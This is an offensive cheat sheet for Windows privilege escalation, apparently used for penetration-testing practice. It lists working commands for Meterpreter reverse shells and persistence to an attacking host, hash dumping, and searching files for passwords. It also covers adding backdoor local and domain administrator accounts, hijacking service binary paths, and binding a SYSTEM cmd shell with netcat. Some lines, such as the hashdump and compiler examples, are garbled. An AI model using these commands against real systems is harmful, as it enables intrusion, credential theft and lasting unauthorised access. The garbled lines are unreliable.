**TL;DR**  
+ **WHOAMI**?  
whoami  
+ **CAN I DO SPECIAL THINGS**?  
WHOAMI /PRIV  
+ **SERVICES** **-->** SERVICES AT BOOT **&** SERVICES RAN THROUGH **ICACLS**.**EXE**  
wmic service get name,startname  
NET START  
+ **NETWORK** **CAPABILITIES?** (CHECKS FOR 127)  
+ **SHELL** **CAPABILITY** **-->** STAGED/NON-STAGED? FORMAT? ARCH? ENCODER? BIND/REVERSE?  
+ **SHELL** **CAPABILITY** **-->** ENSURE CODE EXEC.  
+ **NETWORK CAPABILITY.**  
NETSTAT -ANOY  
+ **NET USERS** (LATERAL MOVEMENT CAPABILITIES?)  
NET USERS  
NET LOCALGROUP  
NET USER <USERNAME> (AM I ADMIN? ANY SPECIAL GROUPS?)  
+ **ADMIN CAPABILITY?**  
NET LOCALGROUP ADMINISTRATORS  
+ **PERMITTED TRAFFIC** **CAPABILITY**???  
netsh advfirewall firewall show rule name=**all**  
netsh advfirewall firewall show rule name=**inbound**  
netsh advfirewall firewall show rule name=**outbounD**  
+ **FILE TRANSFER CAPABILITY**???  
CERTUTIL?  
FTP?  
TFTP?  
VB?  
PS?  
SMB?  
NFS?  
+ **ANY SCHEDULED TASKS I/O OPERATIONS**?  
C:\ > schtasks /query /fo LIST /v > schtasks.txt  
+ **BINPATHS**?  
SC.EXE  
[ **+** More to Come ]  
  
**Other Articles:**  
[https://www.fuzzysecurity.com/tutorials/16.html](https://www.fuzzysecurity.com/tutorials/16.html)  
[https://book.hacktricks.xyz/windows/windows-local-privilege-escalation](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)  
  
+ **Pro-tip - To prevent your shell from hanging as a result of any of these commands, prefix them with this!**  
cmd.exe /c <commands>  
cmd.exe /c start <commands>  
  
**+ Pro-tip - Windows Powershell Execution Policy Bypass:**  
PowerShell.exe -ExecutionPolicy UnRestricted -File .shell.ps1

  
+ **I just got shell on windows! What would S1REN do?**  
**-->** Get a meterpreter shell.  
When it comes to a windows machine and receiving a low privilege shell - I do not mess around. I will always immediately work to maintain access and gain a more useful shell with meterpreter.  
msfconsole  
use exploit/multi/handler  
set PAYLOAD windows/meterpreter/reverse_tcp  
set LHOST <Attacking Machine IP>  
set LPORT <Listening Port>  
  
**Maintaining Access with Meterpreter:**  
[https://www.offensive-security.com/metasploit-unleashed/maintaining-access/](https://www.offensive-security.com/metasploit-unleashed/maintaining-access/)

**meterpreter>** run persistence -U -i 5 -p 443 -r <Attacking Machine IP>
**[*]** Creating a **persistent** agent: **LHOST**=<Attacking Machine IP> **LPORT**=443 (interval=5 onboot=true)
**[*]** **Persistent** agent script is 613976 bytes long
**[*]** Uploaded the **persistent** agent to **C:\WINDOWS\TEMP\yyPSPPEn.vbs**
**[*]** Agent executed with **PID 492**
**[*]** **Installing** **into autorun** as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
**[*]** **Installed** **into** **autorun** as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\YeYHdlEDygViABr
**[*]** For **cleanup** use command: run multi_console_command -rc /root/.msf4/logs/persistence/XEN-XP-SP2-BARE_20100821.2602/clean_up__20100821.2602.rc
**meterpreter>**
**meterpreter>** **reboot** 
Rebooting... 
**meterpreter>** **exit** 
**meterpreter>** **sysinfo**
Computer: XEN-XP-SP2-BARE
OS      : Windows XP (Build 2600, Service Pack 2).
Arch    : x86
Language: en_US
**meterpreter>**

+ **Forward out a _vulnerable_ _service_ with meterpreter.**  
**meterpreter>** portfwd add -l <Attacker PORT> -p <Victim PORT> -r <Victim IP>  
**meterpreter>** portfwd add -l 3306 -p 3306 -r <Victim IP>  
**$** rdesktop 0.0.0.0  
  
+ **Dude just do this with your meterpreter shell - trust S1REN.**  
use exploit/windows/local/service_permissions

+ **Payloads**  
**-->** Checkbox target machine's **file arch** (x86, x64).  
**-->** Checkbox target machine for _**staged**_ OR _**non-staged**_ payloads..  
  
+ **Execute a Powershell Script.**  
powershell.exe 'C:\Tools\**privesc.ps1**'  
  
+ **I need to enumerate out the System Information.**  
_**Save this info**_ - it can be utilized with other windows privesc checking tools (based on installed patches, OS Versioning, etc)  
systeminfo  
  
+ **Who am I?**  
whoami  
echo %username%

+ **Privileges**  
whoami /priv  
  
+ **List out all NT AUTHORITY/SYSTEM Services.**  
wmic service get name,startname |FINDSTR "NT"  
  
+ **Print Nightmare?**  
whoami /priv  
SetImpersonatePrivilege Enabled? 🙂

+ **Domain Box?**  
Bloodhound? Sharphound?

+ **Can we Install Things _Elevated_?**  
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated  
[Installing Elevated]  
msiexec /i <path to msi file>  
  
+ **Some Domains.xml Abuse.**  
[https://github.com/FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

  
+ **Will the path to privilege escalation lie in a executable binary or service in Program Files? Is it listening on local only and thus we missed it from the outside scans?**  
cd "C:\Program Files"  
DIR /A /O /Q  
  
cd "C:\Program Files (x86)"  
DIR /A /O /Q  
  
+ **What is my current user's privileges?**  
net user someWindowsUser  
  
+ **What are other user's privileges?**  
net users  
  
+ **Hash Collection:**  
**pg_dump**.exemeterpreter > **hashdump**

**ntds.dit exfiltration.  
**  
+ **Who's the Administrator(s) around here?**  
net localgroup administrators  
  
+ **Might we be able to move laterally to them if they are Administrators?**  
net user somePotentialAdminUser  
  
+ **Firewall Information?**  
netsh firewall show state  
netsh firewall show config  
  
+ **Network Information** (_who am I connected to? can anything off of Loopback be forwarded out to 0.0.0.0?_)  
netstat -anoy  
route print  
arp -A  
ipconfig /all  
  
+ **Cleartext Passwords in Files? Search for them.**  
findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
  
+ **Find all those password and credential strings in config files.**  
dir /s _pass_ == _cred_ == _vnc_ == _.config_  
  
+ **Find all passwords in all files...**  
findstr /spin "password" _._  
  
+ **WINDOWS SHARES.**  
NET SHARE  
NET USE  
  
**--> CREATE A SHARE ON WINDOWS FROM THE COMMAND LINE:**  
NET SHARE <sharename>=<drive/folderpath> /remark: "This is my share."  
**--> MOUNT A WINDOWS SHARE FROM THE COMMAND LINE:**  
NET USE Z: \\COMPUTER_NAME\SHARE_NAME /PERSISTENT:YES  
**-->** **UNMOUNT SHARE:**  
NET USE Z: /DELETE  
**-->** **DELETE A SHARE ENTIRLEY:**  
NET SHARE /DELETE  
  
+ **Find ALL weak file permissions per drive.**  
accesschk.exe -uwqs Users c:*.*  
  
+ **A part of group "Authenticated Users" - you would be surprised if you have a real user.**  
accesschk.exe -uwqs "Authenticated Users" c:*.*  
  
  
+ **Add an Administrator User with all of the goodies.**  
cmd.exe /c net user siren superPassword /add  
cmd.exe /c net localgroup administrators siren /add  
cmd.exe /c net localgroup "Remote Desktop Users" siren /add  
  
+ **Adding a Windows Domain Administrator from the Command Line:**  
cmd.exe /c net user siren superPassword /add  
net localgroup Administrators siren /ADD /DOMAIN  
net localgroup "Remote Desktop Users" siren /ADD /DOMAIN  
net group "Domain Admins" siren /ADD /DOMAIN  
net group "Enterprise Admins" siren /ADD /DOMAIN  
net group "Schema Admins" siren /ADD /DOMAIN  
net group "Group Policy Creator Owners" siren /ADD /DOMAIN  
  
+ **Time and our own _Scheduled Tasks_.**  
time  
The current time is: 6:41:05.81  
at 06:42 /interactive "C:\Tools\sirenMaint.exe"  
  
+ **Create a Task. Run as System. Every 5 minutes. Path to binary.**  
schtasks /create /ru SYSTEM /sc MINUTE /MO 5 /tn RUNME /tr "\"C:\Tools\sirenMaint.exe\""  
**Attacking Machine:**  
nc -lvp 443  
**Victim Machine:**  
schtasks /RUN /TN "RUNME"  
  
+ **Fun with Accesschk Enumeration!**  
accesschk.exe /accepteula (_always do this first!!!!!_)  
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)  
accesschk.exe -uwcqv "Authenticated Users" * (_won't yield anything on Win 8_)  
accesschk.exe -ucqv [service_name]  
  
**#Find ALL weak folder permissions, per drive.**  
accesschk.exe -uwdqs Users c:\  
accesschk.exe -uwdqs "Authenticated Users" c:\  
accesschk.exe -uwqs Users c:*.*  
accesschk.exe -uwqs "Authenticated Users" c:*.*  
  
  
+ **Let me guess, you came in as NT AUTHORITY\NETWORK SERVICE** **?**  
MS09-012.exe "whoami"  
Initiate Network-Related Transfer _Again_.  
MS09-012.exe "ftp -v -n -s:ftp.txt" and come back in NT Shell.

  
+ **I enumerated a weak service path on the machine. How do I exploit this... S1REN?**  
sc config UPNPHOST binpath= "C:\Tools\sirenMaint.exe"  
sc config UPNPHOST obj= ".\LocalSystem" password= ""  
sc config SSDPSRV binpath= "C:\inetpub\siren\sirenMaint.exe"  
sc config SSDPSRV obj= ".\LocalSystem" password= ""  
sc config SSDPSRV start= "demand"  
(_Now, Stage matching msfvenom Payload Listener in Meterpreter_)  
net stop SSDPSRV  
net start SSDPSRV  
  
+ **Up to Vista...**  
psexec -i -s cmd.exe  
  
+ **On Windows XP and Older we can get an Administrator Privilege shell.**  

_**-->**_ IF you have a GUI with a USER THAT IS INCLUDED IN THE Administrators GROUP you first  
need to open up cmd.exe for the administrator. If you open up the cmd that is in  
Accessories it will be opened up as a normal user. And if you rightclick and do  
Run as Administrator you might need to know the Administrators password. Which  
you might not know. So instead you open up the cmd from C:\windows\system32\cmd.exe.  
This will give you a cmd with _Administrators Rights_.

**-->** _From here, we want SYSTEM level privileges, no?_  
**-->** First we check what time it is on the local machine.  
time  
**-->** Now we set the time we want the system CMD to start.  
**-->** Probably one minuter after the time.  
at 01:23 /interactive cmd.exe  
**System Shell.**  
  
+ **Ahh, so you're interested in UNQUOTED SERVICE PATHS... eh?**  
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\" |findstr /i /v """  
  
**-->** Using SC:  
sc query  
sc qc <service name>  
  
_**-->**_ Okay S1REN, what am I looking for here?  
If the results of the above command's value of path only contains "" and spaces - it's vulnerable.  
  
_**-->**_ Have a hit?  
_**-->**_ Use icacls or cacls.exe (both native to Windows) to check binary permissions.  
icacls "C:\Program Files (x86)\UNQUOTED_SERVICE_PATH_SOFTWARE"  
  
_**-->**_ _Exploit it._  
_**-->**_ _If the path of the Binary file is:_  
C:\Program Files\something\something.exe  
_**-->**_ _Then,_  
move something.exe something.exe.BACK  
move sirenMaint.exe C:\Program Files\something\  
move sirenMaint.exe something.exe  
  
_**-->**_ Well, wasn't that fun? Now our payload will get executed instead of the intended exe!  
_**-->**_ _Nice._  
  
**#S1REN, is there a better way to enumerate out every service and then just check for which of them has an Unquoted Bin Paths?  
**_**-->** Yup._  
**-->** _Thanks S1REN!_  
cd "C:\Windows\TEMP"  
sc query state= all | findstr "SERVICE_NAME:" >> ServiceNames.txt  
FOR /F %i in (ServiceNames.txt) DO echo %i  
type ServiceNames.txt  
FOR /F "tokens=2 delims= " %i in (ServiceNames.txt) DO @echo %i >> Services.txt  
FOR /F %i in (Services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt  
type path.txt  
  
_Nice._  
  
**#Continued**  
**-->** S1REN.  
**-->** Yes?  
**-->** Is there a way to do essentially the same thing and then recursively execute icacls.exe or cacls.exe on them to get the information I need?  
**-->** Yup.  
cd "C:\Windows\TEMP\"  
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> C:\windows\temp\permissions.txt  
  
**icacls.exe:**  
for /f eol^=^"^ delims^=^" %a in (C:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"  
  
**cacls.exe**  
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c cacls "%a"  
  
IF YOU FIND A SERVICE THAT HAS WRITE PERMISSIONS set to "EVERYONE", you can change  
that binary INTO YOUR OWN CUSTOM BINARY and make it execute in the privileged context.  

+ **Dealing with Scheduled Tasks with SYSTEM Privileges.**  
**-->** Here we are looking for tasks that are run by a privileged user, and run a binary  
that we can overwrite.  
schtasks /query /fo LIST /v > schtask.txt  
type schtask.txt  
(Copy that output to a temporary file

**-->** Yeah I know this ain't pretty, but it works. You can of course change the name  
SYSTEM to another privileged user. In other words, copy the output into Kali and  
just grep for SYSTEM.  
**-->** Nice, S1REN.  
**-->** Thanks.  
cat schtask.txt | grep "SYSTEM|Task To Run" | grep -B 1 SYSTEM --color=auto  
  
**-->** **Now, Change up the UPNP Service Binary Path (for example):**  
sc config upnphost binpath= "C:\Tools\nc.exe -nlvp 6666 -e C:\Windows\system32\cmd.exe"  
sc config upnphost obj= ".\LocalSystem" password= ""  
sc config upnphost depend= ""  
net stop <service>  
**-->** Attacking Machine  
nc -nlvp 6666  
net start <service>  
  
**Tools:**  
(Remember how I said to save a local copy of that systeminfo output?)  
[https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)  
  
+ **How do I cross-compile payloads for Windows on Linux, S1REN?**  
**-->** Dude, _check this out_.  
apt-get install mingw-w64  
  
**+ Cross-Compilation Reference:**  
- Ci686-w64-mingw32-gcc hello.c -o hello32.exe       
- 32-bitx86_64-w64-mingw32-gcc hello.c -o hello64.exe      
- 64-bit # C++i686-w64-mingw32-g++ hello.cc -o hello32.exe      
- 32-bitx86_64-w64-mingw32-g++ hello.cc -o hello64.exe   # 64-bit

  
+ **Migrate to a stable process.**  
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/  
**-->** "_Using the **migrate** post module, you can migrate to another process on the victim._"  
**meterpreter>** run post/windows/manage/migrate  
**meterpreter>** migrate -h  
**meterpreter>** migrate <PID>
